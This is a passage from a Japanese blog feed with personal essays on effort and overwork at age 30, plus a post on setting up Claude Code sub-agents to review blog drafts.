ばれた側の人間でもない。器には限界がある。どうしようもなく、限界がある。周りを見れば、自分より優秀な人間なんていくらでもいる。悔しいが、事実だ。そして、もう1つ。万全の状態で仕事に臨める日なんて、一生来ない。体調が悪い。眠れていない。私生活がぐちゃぐちゃだ。そんな日の方が、圧倒的に多い。それでも、やる。最悪の日であっても、最低限の水準は守る。それがプロだ。凡人だから、積み上げるしかない。万全を待っていたら何も始まらないから、不完全なままでも動ける自分を作るしかない。おわりに「おい、がんばるな」と書いた。今日は「おい、努力しろ」と書いた。矛盾しているように見えるだろう。しかし、矛盾していない。どちらも、同じことを言っている。「考えずに頑張るな」「ただし、考えながら頑張れ」。これを一言で言えば、「努力しろ」だ。努力には、考えることが含まれている。方向を意識することが含まれている。フィードバックを得ることが含まれている。同時に、努力には、行動することも含まれている。苦しみを引き受けることも含まれている。踏ん張ることも含まれている。「頑張るな」という言葉だけを受け取って、行動しなくなってはいけない。苦しみを避けてはいけない。踏ん張ることをやめてはいけない。考えながら、頑張れ。方向を意識しながら、踏ん張れ。それが、努力だ。「おい、がんばるな」は、片面だけを描いた絵だった。今日は、もう片面を描いた。両方を見て、初めて全体が見える。——と言いたいところだが、正直に言えば、これでもまだ全体ではない。この問題には、2つの面だけでなく、もっと多くの面がある。私が見えていない角度がある。私が経験していない状況がある。私が想像すらできていない視点がある。たとえば、心身の病を抱えている人にとって、「努力しろ」という言葉がどう響くか。私には、本当の意味では分からない。あるいは、社会的な制約の中で選択肢が限られている人にとって、「踏ん張れ」という言葉がどう響くか。私には、本当の意味では分かっていない。私が書いたのは、私の経験から見えた2つの面に過ぎない。他にも面はある。3つ目も、4つ目も、おそらくもっとたくさんある。それは自覚している。だから、この文章を「正解」として読まないでほしい。これは、1つの視点だ。私という人間が、私の経験を通して見た、1つの景色だ。あなたには、あなたの景色がある。あなたの経験から見える面がある。それは、私には見えない面だろう。あなたが今、どちらの言葉を必要としているかは、あなた自身にしか分からない。頑張りすぎて疲弊しているなら、「おい、がんばるな」を読んでほしい。頑張れずに停滞しているなら、「おい、努力しろ」を読んでほしい。どちらの状態にいても、前に進むことをやめるな。前に進むとは、行動することだ。考えることだ。苦しみを引き受けることだ。そして、それを続けることだ。おい、努力しろ。考えながら、頑張れ。方向を見据えながら、踏ん張れ。休みながらも、また立ち上がれ。それが、あなたを前に進ませる唯一の方法だ。参考書籍バカと無知 (新潮新書)作者:橘　玲新潮社Amazon知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazon実力も運のうち　能力主義は正義か？ (ハヤカワ文庫NF)作者:マイケル サンデル早川書房Amazonデジタル・ミニマリスト　スマホに依存しない生き方 (ハヤカワ文庫NF)作者:カル ニューポート早川書房AmazonSLOW　仕事の減らし方――「本当に大切なこと」に頭を使うための３つのヒント作者:カル・ニューポートダイヤモンド社Amazon大事なことに集中する―――気が散るものだらけの世界で生産性を最大化する科学的方法作者:カル・ニューポートダイヤモンド社Amazon深い集中を取り戻せ――集中の超プロがたどり着いた、ハックより瞑想より大事なこと作者:井上一鷹ダイヤモンド社Amazonジェームズ・クリアー式 複利で伸びる1つの習慣作者:ジェームズ・クリアーパンローリング株式会社Amazonクリティカル・ビジネス・パラダイム――社会運動とビジネスの交わるところ作者:山口 周プレジデント社Amazon人生の経営戦略――自分の人生を自分で考えて生きるための戦略コンセプト２０作者:山口 周ダイヤモンド社Amazon知的戦闘力を高める 独学の技法作者:山口 周ダイヤモンド社Amazonモンク思考―自分に集中する技術作者:ジェイ・シェティ東洋経済新報社AmazonSENSE FULNESS　どんなスキルでも最速で磨く「マスタリーの法則」作者:スコット・Ｈ・ヤング,小林　啓倫朝日新聞出版Amazon新版　究極の鍛錬作者:ジョフ・コルヴァンサンマーク出版Amazon心眼――あなたは見ているようで見ていない作者:クリスチャン・マスビアウプレジデント社AmazonQUEST「質問」の哲学――「究極の知性」と「勇敢な思考」をもたらす作者:エルケ・ヴィスダイヤモンド社Amazon資本主義が人類最高の発明である：グローバル化と自由市場が私たちを救う理由作者:ヨハン・ノルベリニューズピックスAmazon資本主義にとって倫理とは何か作者:ジョセフ・ヒース,瀧澤弘和慶應義塾大学出版会Amazon","isoDate":"2025-12-02T15:20:23.000Z","dateMiliSeconds":1764688823000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"生成AIエージェントによるブログレビュー環境の構築（下）","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/03/001146","contentSnippet":"この記事は、3-shake Advent Calendar 2025 3日目のエントリ記事です。上巻の振り返り上巻では、Commandsを使ったブログレビュー環境の基礎を説明しました。/deep-thinking-prompt で書く前に深く考える/blog-quality-review で6つの観点からレビューする/ai-humanity-check でAIっぽさを検出する/full-review で全自動レビューするこれらのCommandsは、レビュー観点を構造化し、一貫性を担保してくれます。syu-m-5151.hatenablog.com下巻では、より高度なSubagentsの活用へ入る前に、いくつかの話題を深掘りします。AIに記事を書かせるとは何か「AIに記事を書かせる」という言葉をめぐって、しばしば議論が起きます。「それは本当にあなたの記事なのか」「AIが書いたものに価値があるのか」。私の答えは明確です。記事はほとんどAIに書かせています。しかし、価値の源泉は私にあります。手書きで書いているという人も別に紙に直接書いている訳ではないでしょう。既に、予測変換やLSP（Language Server Protocol）による補完など、さまざまなレベルで「AIやコンピュータの支援」を受けながら文章を書いています。その延長線上に、生成AIによる執筆があるに過ぎません。では、私は何を担っているのでしょうか。「身体性」を供給しています。ここで言う身体性とは、知識が「情報」から「経験」へと変容する過程で生じる、一人称的な認知の軌跡です。知識と経験の断絶たとえば、あるエンジニアがRustの所有権システムを学んでいるとします。The Bookを読み、概念は「理解した」つもりでいました。しかしいざコードを書くと、コンパイラからcannot borrow as mutable...というエラーを食らいます。「ルールは知っているはずなのに、なぜ」——この「知っている」と「書ける」の間にある断絶こそが、身体性が欠落している状態です。そして、その断絶を越えた瞬間の記録があります。「なぜエラーになったのか格闘し、イテレータの内部構造に気づき、腹落ちした瞬間」——これこそが身体性を伴った学習の言語化です。それは他者に伝達可能な「生きた知見」となります。この「苦闘から理解への遷移（プロセス）」だけは、AIには生成できません。AIは私の代わりに試行錯誤できませんし、私の代わりとしてコンパイラに叱られて悔しがることもできないからです。AIの役割は、私が供給した「生の体験（身体性）」を、他者が読める文章として整えることにあります。混沌とした思考を構造化し、読者にとって消化しやすい形に変換します。それは編集者の仕事に近いです。私が素材（身体性）を提供し、AIが構造化し、私がレビューして調整します。この協働のプロセス全体が、現代における「執筆」なのです。「流暢な嘘」という罠一方で、「AIで書いた記事には価値がない」という批判も、ある意味では正しいです。問題の本質は「AIを使ったこと」ではなく、「検証というプロセスが抜け落ちていること」にあります。AIに丸投げして出力された文章には、不正確な情報の垂れ流しという致命的なリスクが潜みます。厄介なのは、AIの生成する文章が文法的に完璧で、論理の構成も美しすぎることです。人間が書いた拙い文章なら「この人、理解していないな」と直感的に警戒できます。しかし、AIの出力は「もっともらしさ（Plausibility）」に特化しているため、嘘であってもスルスルと頭に入ってきてしまいます。これを検証せずに公開するのは、ブレーキの効かない車を公道に放つようなものです。LLMは確率的に「次の単語」を選んでいるに過ぎません。そこに真偽への誠実さは存在しません。だからこそ、その確率の波を制御し、事実という地面に杭を打つのは、人間にしかできない仕事です。私たちは、AIというエンジンの出力に酔うのではなく、冷静な「監修者」であり続けなければなりません。しかし、この監修作業を人間の力だけで行うには限界があります。だからこそ、「AIを監視するAI」が必要になるのです。それがこれから紹介する「Sub-agents」によるレビュー体制です。Commandsの限界とSub-agentsの登場上巻で紹介したCommands（/blog-quality-reviewなど）は便利ですが、長く使っていると2つの困難にぶつかります。コンテキストの枯渇: 長文記事に対し、複数の観点で深いレビューを繰り返すと、メインの会話履歴（コンテキストウィンドウ）がすぐに溢れてしまう。専門性の欠如: 1つのプロンプトにあらゆる指示を詰め込むと、焦点がぼやけ、鋭い指摘ができなくなる。そこで導入したのが、Claude Codeの強力な機能、Sub-agentsです。Sub-agentsとは何かhttps://code.claude.com/docs/en/sub-agents:embed:citeSub-agentsは、特定のタスクに特化した自律的なAIワーカーです。これまでの「Commands（定型文の挿入）」とは、根本的にアーキテクチャが異なります。1. コンテキストの分離（Context Isolation）これが最大にして最強のメリットです。通常、長い記事をレビューさせると、「思考過程」や「中間生成物」でメインの会話履歴が埋め尽くされてしまいます。しかしSub-agentsは、メインとは独立した別のコンテキストウィンドウで作業します。完全にレビュワーに徹することができます。もちろんデメリットもあるので使い分けが必要です。User │ ▼Main Agent │ [Delegate] 記事テキストを渡し、レビューを依頼 ▼Sub-Agent (Reviewer) ┃ ★独自のコンテキストで思考★ ┃ 1. 全文読み込み ┃ 2. 批判的検討 ┃ 3. 推敲（ここのトークンはメインには見えない） ┃ ▼Main Agent (レビュー結果の要約のみを受取) │ ▼User (修正案の提示)メインエージェントが受け取るのは、Sub-agentが導き出した「結論」だけです。これにより、メインのコンテキストを汚染することなく、大量のトークンを使った深い推論が可能になります。2. 自律的な委譲（Delegation）Commandsはユーザーが手動で呼び出すものですが、Sub-agentsはメインのエージェント（Orchestrator）が必要だと判断した時に自動的に呼び出されます。「この記事、なんか読みづらいから直して」と指示するだけで、メインエージェントが「これは『文章校正エージェント』と『構成作家エージェント』の出番だ」と判断し、仕事を割り振ります。私が実際に配備しているSub-agents私は現在、ブログ執筆チームとして以下のSub-agentsを .claude/agents/ に配備しています。実際にはもっといますが、今回は3つだけ実際に使っているものを紹介します。1. narrative-architect.md （物語構造の専門家）技術記事であっても、読者の感情を動かす「物語」が必要です。このエージェントは、技術的な正しさには口を出しません。その代わり、「読者の感情の旅路（Emotional Journey）」だけを見ます。役割: 導入で共感を得られているか。解決策の提示でカタルシスがあるか。指摘例: 「機能の説明は正確だが、読者が抱えている『辛さ』への共感が不足しており、解決策の価値が伝わりにくい」2. fresh-eye-reviewer.md （永遠の初学者）私の「書き手の呪い」を解くためのエージェントです。ペルソナとして「実務未経験のジュニアエンジニア」が埋め込まれています。役割: 専門用語の困難、論理の飛躍、「なぜ」という素朴な疑問の発見。特徴: 文脈をあえて読まない。「ここまでの説明では、この単語の意味がわからない」と冷徹に指摘する。3. ai-police.md （AI警察）「AIっぽさ」を検知し、排除する専門官です。AIが生成した文章特有の「過剰な接続詞」「中身のない美しいまとめ」「冗長な言い回し」を検挙します。役割: テキストの人間らしさ（Humanity Score）の判定。指摘例: 「『〜ということができる』は冗長だ。『〜できる』と言い切るべき。また、この段落の『いかがでしたか』はAI臭いので削除を推奨する」実践：レビュー体制の構築これらのSub-agentsを連携させることで、私のブログ執筆フローは完全に変わりました。ディレクトリ構造.claude/├── commands/           # ユーザーが叩くショートカット│   └── full-review.md  # 全体を統括する指示書└── agents/             # 自律的に動く専門家たち    ├── narrative-architect.md    ├── fresh-eye-reviewer.md    └── ai-police.mdレビューの流れStep 1: 執筆（協働）私とメインエージェントで対話しながら、記事のドラフトを作成します。私は身体性（エピソード）を話し、エージェントがそれを整えます。Step 2: 全自動レビュー（委譲）書き上がったドラフトに対し、私は一言こう告げるだけです。「/full-review を実行して」すると、メインエージェントが裏側で複数のSub-agentsを起動します。Fresh Eye が「ここがわからない」と文句を言う。Narrative Architect が「構成が退屈だ」と指摘する。AI Police が「AIっぽい表現がある」と警告する。Step 3: 統合と修正メインエージェントは、これらのバラバラな意見を統合し、優先順位をつけて私に提示します。「初学者にとって難解な部分があり、かつAI特有の冗長な表現が残っています。まずは第2章の具体例を修正しましょう」私はその統合されたレポートを見て、最後に修正します。まとめ上巻から下巻を通じて、生成AIエージェントを用いたブログレビュー環境の構築について解説してきました。上巻: ブログの評価基準をCommandsで構造化し、手動レビューの面倒臭さを解消する方法。下巻: Sub-agentsを用いてコンテキストを分離し、専門特化した「編集チーム」を作る方法。この環境を構築して気づいたのは、私の仕事が「執筆者（Writer）」から「編集長（Editor in Chief）」へとシフトしたということです。実際に手を動かして書く（Generate）のはAIでしょう。しかし、「何を書くか（企画）」「なぜ書くか（熱量）」「品質は十分か（承認）」を判断するのは、人間にしかできません。AIエージェントは、我々から仕事を奪うものではありません。我々を、より高次な意思決定を行う「マネージャー」へと押し上げてくれる存在です。もしあなたが「記事を書くのが面倒だ」「自分の文章に自信がない」と感じているなら、まずは小さなCommandを1つ作ることから始めてみてください。そこには、孤独な執筆作業とは違う、頼れるバディとの協働が待っているはずです。","isoDate":"2025-12-02T15:11:46.000Z","dateMiliSeconds":1764688306000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おい、がんばるな","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/02/124702","contentSnippet":"はじめに先日、久しぶりに会った友人に言われた。「なんか最近、顔が疲れてない？」と。私は「まあ、仕事が忙しくて」と答えた。友人は「頑張ってるんだね」と言って、ビールを一口飲んだ。頑張ってる。その言葉を聞いた瞬間、なぜか胸のあたりがざわついた。褒められているはずなのに、全然嬉しくない。むしろ、何かを見透かされたような、居心地の悪さがあった。帰り道、ずっと考えていた。私は確かに頑張っている。毎日遅くまで働いているし、休日も勉強しているし、やるべきことは山ほどある。でも、だから何なんだろう。頑張っているから、何なんだ。30歳になった。節目だとか、大人になったとか、そういう感慨は特にない。ただ、20代の頃とは何かが決定的に違う。何が違うのか、最初はよく分からなかった。体力が落ちたとか、徹夜ができなくなったとか、そういう分かりやすい話でもない。しばらく考えて、ようやく気づいた。「頑張っている」という言葉が、免罪符にならなくなったのだ。20代の頃は、頑張っていれば許された。成果が出なくても、方向が間違っていても、「でも頑張ってるから」で何とかなった。周りもそう言ってくれたし、自分でもそう信じていた。頑張ることそのものに価値がある、と。でも30歳になって、その魔法が解けた。頑張っているのに何も変わらない自分がいて、頑張っているのに評価されない現実があって、頑張っているのに前に進んでいない焦りがある。頑張ることが、こんなにも虚しいとは思わなかった。これは、そういう話だ。頑張ることをやめろという話ではない。頑張り方を変えろという話でもない。ただ、「頑張っている」という言葉の正体について、30歳になった私が考えたことを書いてみようと思う。読んでも何も解決しないかもしれない。でも、同じようなことを感じている人がいたら、少しだけ楽になるかもしれない。そういう気持ちで書いている。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。頑張ることの正体30歳の誕生日の夜、窓の外を眺めながら「今日も、頑張った」と思いました。でも、その言葉の後に続くはずの達成感はありませんでした。頑張りで全てを説明しようとしていた朝から晩まで働いていました。画面を見つめ、会議に出て、そこから開発をしていました。体は確かに疲れています。なのに、何も前に進んでいないという感覚が胸の奥に重く沈んでいるのです。社会人として8年が経ちました。20代前半の私は「頑張っている自分」が好きでした。努力している姿が自分の価値を証明してくれると思っていたからです。朝誰よりも早く出社し、夜遅くまで残り、休日も勉強する。その生き方が正しいと信じていました。しかし最近、ある事実に気づいてしまったのです。頑張ることそれ自体が、いつの間にか目的になっていたということに。本来、頑張ることは手段であるはずです。何かを達成するため、何かを得るため、どこかに到達するための手段。しかしいつの間にか、頑張ること自体が目的にすり替わっていました。「頑張っている自分」でいることが目的になり、その先に何があるのかを問うことをやめていたのです。ふと考えてしまいます。もし努力が一切報われない世界だったとしても、私はそれでもなお「頑張りたい」と願うだろうか。結果のために頑張っているのか。それとも、頑張ること自体が自分の生き方なのか。この2つは似ているようで、まったく違います。前者であれば、結果が出なければ頑張りは無意味になります。だから私たちは結果を求め、結果が出ないと焦り、自分を責めます。しかし後者であれば、結果に関係なく、頑張ること自体に意味があります。たとえ報われなくても、その過程に価値を見出すことができます。私は長い間、自分は後者だと思っていました。「努力することに意味がある」と信じていたからです。しかし正直に自分を見つめると、違いました。私は結果を求めていました。評価を求めていました。だから結果が出ないと苦しくなり、評価されないと自分を否定したくなったのです。もし本当に「頑張ること自体が生き方」なのだとしたら、結果が出なくても穏やかでいられるはず。しかし私はそうではなかった。頑張ることは純粋な生き方ではなく、結果を得るための手段だったのです。手段であるならば、その手段が有効かどうかを確かめなければなりません。目的地に近づいているかどうかを確認しなければなりません。しかし私は、頑張ること自体を目的にすり替えることで、そこを考えることから逃げていたのです。全部やろうとした結果具体的な話をさせてください。社会人になって数年目のことです。私は様々なことに挑戦させてもらっていました。自分の案件、登壇、ブログ執筆。それにまた、輪読会の運営、勉強会の主催、社内ドキュメントの管理と整備、新卒採用の担当。文脈のない色んなことを並列でやっていました。全部やりたかったのです。全部できると思っていました。結果として、全てが中途半端になりました。輪読会は準備不足で進行がグダグダになり、参加者が気まずそうに沈黙する場面が何度もありました。勉強会は告知が遅れて参加者が集まらず、3人しかいない会場で虚しくスライドをめくりました。ドキュメントは途中まで書いて放置され、それを指摘されることもないまま死にドキュメントが増えていきました。採用面談では候補者の情報を十分に把握できていないまま臨んでしまい、的外れな質問をして相手を困惑させました。自分の案件も遅れ、登壇の準備も直前までバタバタし、ブログは下書きのまま溜まっていきました。どれも「ちょっとずつダメ」だったのです。致命的な失敗ではない。でも、どれも胸を張って「やり遂げた」とは言えない。そして厄介なことに、中途半端にやっている間は、誰からもフィードバックをもらえなかったのです。なぜでしょうか。私が「頑張っているように見えた」からです。人は頑張っている人に「中途半端だ」とは言いにくいものです。遅くまで残っている。色々なことを引き受けている。一生懸命やっている。そういう姿を見ると、たとえ成果が出ていなくても「まあ、頑張ってるし」と見逃してしまう。指摘する側も遠慮してしまうのです。だから私は、自分が中途半端であることに気づけませんでした。周りも言ってくれないし、自分でも「頑張っている」という事実で目が曇っていたのです。ここで気づいたことがあります。私が選んだことだけでなく、選ばずに放置していたものが、私の人生を形作っていたということです。何かを選ぶとき、私たちは選んだものに意識を向けます。しかし、選ばなかったもの、手を付けずに残してしまったものについては、あまり考えません。でも実際には、その「選ばなかったもの」が積み重なって、今の自分を作っています。私の場合、「深く集中する時間」を選ばずに放置していました。「1つのことに没頭する経験」を選ばずに放置していました。全部やろうとすることで、何も深くやらないという選択を、無意識のうちにしていたのです。選択の影にあるもの——それを自覚することが、変わるための第一歩でした。総量が同じなら全部できるタイプの人もいるでしょう。器用にタスクを切り替えて、それぞれに必要な集中を注げる人。でも私は、おそらくそういうタイプではなかったのです。1つのことに深く集中しているときは力を発揮できる。でも、複数のことを並列で抱えると、どれにも集中できなくなる。頭の中が常に「あれもやらなきゃ、これもやらなきゃ」で埋まっていて、目の前のことに没頭できない。問題は、私が怠けていたことではありませんでした。全部やろうとしすぎていたことだったのです。そしてもう1つ気づいたことがあります。私が盲目的に全部を抱え込んでいる間、周りの人にも迷惑をかけていたということです。中途半端な準備で運営した勉強会に参加してくれた人たち。私の遅れのせいでスケジュールを調整しなければならなかったチームメンバー。頑張ることは、時に暴力になります。自分だけでなく、周りの人も苦しめてしまうのです。頑張らないことへの恐怖こうした経験があっても、頑張ることをやめるのは難しい。頑張ることに疲れたと思った瞬間、罪悪感が襲ってきます。「頑張らないなんて怠け者だ」「頑張らなかったら停滞してしまう」。心の中で誰かの声が私を責めるのです。この恐怖はどこから来るのでしょうか。少し立ち止まって考えてみると、そこには1つの混同があることに気づきます。私たちは「頑張らないこと」と「怠けること」を同じものだと思い込んでいるのです。しかしある時気づきました。頑張らないことと怠けることは違い、そして頑張ることと前に進むことも違うのだということに。これを整理すると、こうなります。「頑張る」とは、エネルギーを注ぎ込むことです。「前に進む」とは、目的地に近づくことです。そして「怠ける」とは、必要なことをしないことです。エネルギーを注ぎ込んでも、方向が間違っていたら目的地には近づきません。逆に、エネルギーを節約しても、正しい方向に進んでいれば目的地に近づくことができます。頑張りすぎて何も達成できないより、戦略的に力を抜いて1つを確実に達成した方が価値がある。頑張らないことへの恐怖を掘り下げていくと、その根底にあるのは「失敗への恐れ」でした。しかし、よりその下を掘ると、本質的な恐怖が見えてきます。私が本当に恐れていたのは、失敗そのものだったのか。それとも、「誰かに失敗を見られること」だったのか。私が本当に恐れていたのは、失敗そのものではありませんでした。失敗を誰かに見られること、「あいつは頑張らなかったから失敗した」と思われること、それが怖かったのです。一人で挑戦して一人で失敗するのは、実はそこまで怖くありません。痛いけれど、学びになります。しかし、その失敗を誰かに目撃されること、評価されること、噂されること——それが耐えられなかったのです。つまり、私の恐怖の本質は「社会的評価への恐れ」でした。自分自身の内側の痛みではなく、他者の目に映る自分の像への恐れだったのです。この区別は重要です。なぜなら、恐怖の正体を知ることで、対処の仕方が変わるからです。失敗そのものが怖いのであれば、リスクを減らす工夫をすればいい。しかし「失敗を見られること」が怖いのであれば、問題は失敗ではなく、他者の評価に自分の価値を預けすぎていることにあります。頑張ることをやめて考えることを始めた時、初めて前に進み始め、結果を出せるようになりました。頑張ることへの依存頭では分かっていても、頑張ることをやめられませんでした。私はたぶん、頑張ることに依存していたのです。朝起きるとすぐに仕事を始め、休憩も取らずに夜遅くまで働いて疲れ果てて眠り、土日も「せっかくの時間だから」と何かをしていました。「何もしない時間」が怖かったのです。なぜ怖かったのか。それは、何もしていない自分に価値がないと思っていたからです。この考えをもう少し掘り下げてみましょう。私は無意識のうちに、「自分の価値 = 自分がどれだけ頑張っているか」という等式を信じていました。頑張っていない自分は価値がない。価値のない自分を見たくない。そう感じていたから、常に何かをしている必要があり、頑張っている自分でいる必要があったのです。「頑張らなければ価値がない自分」と、「頑張っていなくてもここにいていい自分」。この2つのうち、私は本当はどちらを生きたいのだろう。これは「どちらが正しいか」という論理の問題ではありません。「どちらを選びたいか」という願望の問題です。頭では「頑張っていなくても価値がある」と分かっています。そう言われれば、そうです。でも、本当にそれを信じているかと問われると、自信がありません。心のどこかで「でも頑張らないと......」という声がするのです。その声の正体を知ることが、変わるための第一歩でした。答えは、すぐには出ませんでした。でも、この疑問を抱え続けることが大切でした。論理ではなく願望のレベルで、自分が何を求めているのかを探ること。それが、変わるための出発点になったのです。しかし不思議なことに、頑張れば頑張るほど、成果は出なくなっていきました。うまくいかない理由は頑張りすぎていたからです。頑張ることが思考を停止させていて、「とりあえず頑張る」「とにかく動く」と考えることから逃げていたのです。「頑張ります」という特権振り返ってみると、若い頃の私にはある種の特権がありました。「頑張ります」と言えば、それで許されていたのです。計画が甘くても「頑張ります」、ミスをしても「頑張ります」、結果が出なくても「頑張ります」と言えば許されていました。周囲は「若いんだから」「まだ経験が浅いんだから」「熱意があればいい」と納得してくれたのです。20代前半は特にそうでした。何も考えずにとにかく動き、深夜まで働き、休日も出社していれば評価されました。方向性が間違っていても、やり方が非効率でも、「頑張っている」という事実が全てを覆い隠してくれたのです。「頑張ります」は、思考停止の免罪符でした。考えなくてよく、戦略を立てなくてよく、ただ熱意を見せればよかったのです。がむしゃらは若さという資本で買えた特権だったのです。そしてその「がむしゃら」が、ある種の万能感を生んでいました。体力や気力は無限にあり、睡眠を削っても平気で、理想の自分に向かって駆け上がっていく。そんな勢いが許されていて、いやむしろ求められていたのです。今、手放せずに握りしめている「頑張り」は、本当に自分を守っているのだろうか。それとも、もう要らなくなった古い防具なのだろうか。かつて「頑張ること」は、私を守ってくれました。若くて経験がなくて、何も分からない時期に、「とにかく頑張る」という姿勢は、私の居場所を確保してくれました。がむしゃらに動くことで、「あいつは一生懸命やっている」と認めてもらえたのです。しかし、時間が経ちました。状況が変わりました。求められることも変わりました。かつて私を守ってくれた防具が、今は私の動きを制限しているのではないか。重すぎて前に進めなくなっているのではないか。そう考え始めた時、その防具を一度外してみる勇気が必要でした。転換点という現実しかしその「がむしゃらが許される特別な時間」は、予告なく終わります。私の場合、それは20代後半でした。ある日突然、それまで当たり前にできていたことができなくなりました。朝起きることも人と話すことも簡単な判断さえも重荷になって、「頑張ります」と言ってももう体が動かなくなったのです。今思えば、それはいつか必ず訪れる終わりでした。30歳という年齢は、「頑張ります」だけでは通用しなくなる境界線なのです。この変化はいくつかの形で現れます。まず、周囲の目が変わります。「頑張っている」だけでは評価されなくなります。「で、結果は」「で、どう改善するの」「がむしゃらにやるんじゃなくて、戦略は」と容赦なく聞かれるようになります。30歳は、熱意ではなく戦略が問われる年齢でした。「頑張っている」と「前に進んでいる」は別物だったのです。次に、身体の限界が見えてきます。20代のように無理が効かなくなり、深夜まで働いたら翌日に響き、休日を潰したら週明けのパフォーマンスが落ちます。がむしゃらはもはやコストの方が大きいのです。そして何より、自分自身が「このまま走り続けることに意味があるのか」と考え始めます。がむしゃらに頑張っても前に進んでおらず、ただ消耗しているだけ。そんな実感が、重くのしかかってくるのです。走り続けることと、前に進むことは違う。この当たり前の事実に、私は30歳になってようやく気づきました。なぜ私たちは頑張ってしまうのかしかし、なぜ私たちはそもそもこうなってしまうのでしょうか。なぜ、頑張ってしまうのでしょうか。私なりの答えは、簡単な答えが欲しいからというものです。どういうことか説明させてください。私たちが生きている現実は複雑です。何が正しいのか分からない。どの選択が最善なのか分からない。努力が報われるかどうかも分からない。そういう不確実性の中で生きることは、とても不安なことです。その不安に耐えられないとき、私たちは「頑張れば救われる」という単純で分かりやすい物語の中に逃げ込みます。この物語の中では、何をすべきかが明確です。とにかく頑張ればいい。努力すればいい。諦めなければいい。ネガティブ・ケイパビリティという言葉があります。不確実さや曖昧さに耐える能力のことです。「自分にもあるだろう」などと言ってみたりしますが、実際には、自分が見えている物語があまりにも狭いだけなのです。「頑張る」という単純な行動原理で、複雑な問題を考えずに済ませているだけなのです。頑張っている間は「前に進んでいる」という錯覚が得られて充実感があります。この充実感が曲者です。なぜなら、その錯覚が問題から目を背けさせ、「方向性が間違っているのではないか」という疑問を封じ込めてしまうからです。思考の罠では、なぜ私たちは頑張ることの問題点という明らかな事実に気づけないのでしょうか。その答えは、私たちの思考の仕組みにあります。自分の判断パターンに気づいたことがあります。結論が先にあって、その結論を支持する証拠だけを集め、矛盾する情報は無視していたのです。そして厄介なことに、その正当化のプロセスがあまりにも自然で論理的に見えるため、本人も気づかないのです。自分の信念を守るために、思考を使ってしまうという、これは無意識の傾向です。具体例を挙げましょう。「頑張れば報われる」という信念が先にあって、その信念を支持する証拠だけを集めていました。努力した人の成功例は記憶に残るのですが、努力したのに報われなかった人の存在は意識から消えていってしまいます。30歳になって振り返ると、20代の私は恐ろしいほど確信に満ちていました。「この方法が正しい」「これだけやれば必ず成功する」と疑うことを知らず、いや疑うことを恐れていました。自分の間違いを認めることこの思考の罠から抜け出すために必要なものがありました。自分が間違っているだろうと認めることです。これは簡単なようで、とても難しいことでした。私は「頑張ることは正しい」と信じていました。だから、頑張っても成果が出ない時、「もっと頑張れば」と考えていました。頑張ることが正しいという前提を疑うことは、自分の生き方を否定することのように感じられたのです。しかしある時、意識的に自分の前提を疑ってみることにしました。「頑張らない方がうまくいくことはないか」と。すると、思い当たることがいくつも出てきました。休みを取った翌日の方が、良いアイデアが浮かぶ。締め切りに追われていない時の方が、コードの質が高い。夜遅くまで粘るより、翌朝やり直した方が早く終わる。これは全て、私自身が経験していたことでした。でも「頑張ることは正しい」という信念が強すぎて、その経験を無視していたのです。見たくないものは、見えないようにするというのが、人間の脳の仕組みなのだと知りました。だからこそ、意識的に自分の前提を疑う必要があります。「自分は正しい」という確信から一歩引いて、「自分は間違っているだろう」という可能性を常に心に留めておくこと。それが、思考の罠から抜け出す第一歩でした。確信は、時に最大の敵になる。有限であることを知っている、でも分かっていないでは、なぜ私たちはわざわざこの思考の罠にはまってしまうのでしょうか。なぜ、自分の信念を守ろうとするのでしょうか。その背景には、1つの根本的な事実から目を背けたいという欲求があると私は考えています。それは、人生は有限であるという事実です。この事実を、私たちは「知っている」はずです。人はいつか死ぬ。時間には限りがある。当たり前のことです。でも、本当に分かっているかというと、そうではないのです。思い出してみてください。中学や高校の卒業式の日のことを。「あー、もっと何かできてたな」と思いませんでしたか。部活にもっと打ち込めばよかった。あの子ともっと話せばよかった。文化祭でもっと楽しめばよかった。卒業式の日、私たちは3年間が有限だったことを、ようやく実感します。でも、その実感はすぐに消えるのです。大学に入り、社会人になり、日常に戻ると、また時間が無限にあるかのように振る舞い始めます。「いつかやろう」「そのうち学ぼう」「まだ時間はある」と。30歳になった時、ふと計算してみました。80歳まで生きるとして、残りは50年。週に換算すると約2600週。月に換算すると約600ヶ月。この数字を見た時、卒業式の日の感覚が蘇ってきました。思ったより、少ないのです。でも、きっとこの実感もまた薄れていくのでしょう。明日になれば、来週になれば、また時間が無限にあるかのように振る舞い始める。それが人間なのです。だからこそ、意識的に思い出す必要があるのです。時間は有限であること。すべてをやることは不可能であること。何かを選ぶということは、何かを諦めるということ。この事実を忘れそうになるたび、卒業式の日の感覚を思い出すようにしています。時間管理術という逃避しかし、この事実を常に意識し続けることは難しいものです。むしろ、私たちは無意識のうちにこの現実から目を背けようとします。その典型的な方法が、時間管理術です。「もっと効率的に」「もっと生産的に」と時間管理術に縋りつくのは、現実から目を背けているだけなのです。どれだけ効率化しても、時間は増えないのです。時間管理術は「もっと多くのことができるようになる」という幻想を与えてくれます。しかし実際には、私たちにできることの総量は変わりません。ただ、その有限性を見ないようにしているだけなのです。ここで逆説的なことが起きます。限られた時間を受け入れることが、実は自由への第一歩なのです。すべてをやることを諦めた時、初めて「本当にやりたいこと」が見えてきます。「やるべきこと」ではなく「やりたいこと」へ集中できるようになります。選ばなければならないという制約が、逆に選択を可能にするのです。忙しさというステータス時間が有限だと分かっていても、人は忙しさを求めます。私もそうでした。「忙しい」と言うことが、ある種のステータスでした。忙しい = 重要な仕事をしている = 